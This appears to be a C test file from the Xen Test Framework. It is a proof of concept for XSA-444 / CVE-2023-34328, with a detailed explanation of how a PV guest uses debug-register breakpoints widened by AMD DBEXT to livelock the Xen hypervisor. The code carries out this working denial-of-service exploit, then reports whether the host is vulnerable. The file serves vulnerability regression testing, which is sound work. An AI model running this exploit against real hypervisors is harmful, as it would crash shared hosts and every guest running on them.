/**
 * @file tests/xsa-444/main.c
 * @ref test-xsa-444
 *
 * @page test-xsa-444 XSA-444
 *
 * Advisory: [XSA-444](https://xenbits.xen.org/xsa/advisory-444.html)
 *
 * This is for CVE-2023-34328 only.
 *
 * Xen has a per-domain mapping area, containing the live GDT/LDTs.  On Xen
 * 4.13 and earlier, the Compat Translate Area (XLAT) is adjacent to the
 * GDT/LDTs.
 *
 * The XLAT area isn't used by 64bit PV guests, but it is present in the
 * memory map, which is common to all guest types.  The XLAT area is used by
 * 32bit PV guests, but they can't set a breakpoint address above 4G, and
 * therefore can't mount the attack.
 *
 * Prior to the XSA-444 fix, Xen allowed PV guests to place breakpoints on the
 * XLAT area.  Combined with the AMD DBEXT extension, a breakpoint in the XLAT
 * area can be widened to cover the live GDT too.
 *
 * This results in one of two behaviours, both of which are fatal to Xen.
 *
 * - On AMD Zen2 and older, Xen suffers XSA-156 / CVE-2015-8104.
 *
 * - On AMD Zen3 and later, with the NoNestedDataBp hardware fix for
 *   CVE-2015-8104, things are more complicated.
 *
 *   - Any IRET (which reads the GDT for %cs and %ss) will queue a new @#DB,
 *     which will be delivered in the interrupted context, prior to decoding
 *     the subsequent instruction.
 *
 *   - The delivery of @#DB won't trigger another @#DB because of the hardware
 *     fix.  Xen's debug handler runs normally.
 *
 *   - If the interrupted context was guest context, the @#DB is forwarded to
 *     the guest kernel.  For a 64bit PV guest kernel, this always uses the
 *     SYSRET path out of Xen, and does not trigger a new @#DB.
 *
 *   - A 64bit PV guest kernel leaving it's @#DB handler uses HYPERCALL_iret
 *     in IRET mode rather than SYSRET mode.  This transfers up into Xen via
 *     SYSCALL (no GDT reads), and leaves Xen via IRET, triggering a new @#DB
 *     and livelocking the guest taking @#DB's on same instruction boundary.
 *
 *   - Any IDT delivery which isn't @#DB triggers a new @#DB, causing Xen's
 *     debug handler to observe a @#DB pointing at the ENDBR instruction of
 *     the relevant vector.  The return from the debug handler is to Xen
 *     context, and therefore by IRET, which livelocks.
 *
 *   - Because of the priority of INTR/NMI in the instruction cycle, they take
 *     priority over pending breakpoints.  Therefore over time and dependent
 *     on external stimuli, Xen accumulates IRQS-off, blocked-by-NMI, and an
 *     increasing APIC Priority while still in its livelocked state.
 *
 * @see tests/xsa-444/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-444 PoC";

void test_main(void)
{
    unsigned long xlat;
    desc_ptr gdtr;
    long rc;

    if ( !cpu_has_dbext )
        return xtf_skip("Skip: DBEXT not available\n");

    sgdt(&gdtr);

    xlat = (gdtr.base & ~((1ul << PAE_L4_PT_SHIFT) - 1)) + 0x80000000ul;

    /* Try to place %dr0 over the XLAT area. */
    rc = hypercall_set_debugreg(0, xlat);
    switch ( rc )
    {
    case 0:
        xtf_failure("Fail: Breakpoint set on XLAT area.  Probably vulnerable to XSA-444\n");
        break;

    case -EPERM:
        return xtf_success("Success: Unable to set breakpoint on XLAT area.  Probably not vulnerable to XSA-444\n");

    default:
        return xtf_error("Error: Unexpected error from set_debugreg(): %ld\n", rc);
    }

    /* Turn %dr0 into a 4G-wide breakpoint, which covers the GDT too. */
    wrmsr(MSR_DR0_ADDR_MASK, ~0u);

    /*
     * Activate %dr0.  From this point on, any reference to the GDT will
     * trigger @#DB.  However, as the hypercall is via SYSCALL, the return is
     * via SYSRET which doesn't trigger @#DB.
     */
    hypercall_set_debugreg(7, DR7_SYM(0, G, RW, 64) | X86_DR7_GE);

    /*
     * Beyond the hypercall setting up %dr7, Xen is running on borrowed time.
     *
     * Any interrupt or non-#DB exception will cause Xen to livelock in
     * hypervisor context, but as long as we don't tickle any @#DB cases, we
     * get to keep running.
     *
     * Force a #UD to cause Xen to livelock, if a stray interrupt hasn't done
     * it for us already.
     */
    asm volatile ("1: ud2a; 2:"
                  _ASM_EXTABLE(1b, 2b));

    /*
     * If vulnerable, Xen won't even reach here.  Cross-check with rc from
     * above to provide a definitive statement.
     */
    if ( rc == -EPERM )
        return xtf_success("Success: Xen didn't livelock.  Not vulnerable to XSA-444\n");

    /*
     * If we're running, then some reasoning in the test is wrong.
     */
    return xtf_error("Error: Breakpoint set on XLAT but Xen didn't livelock\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
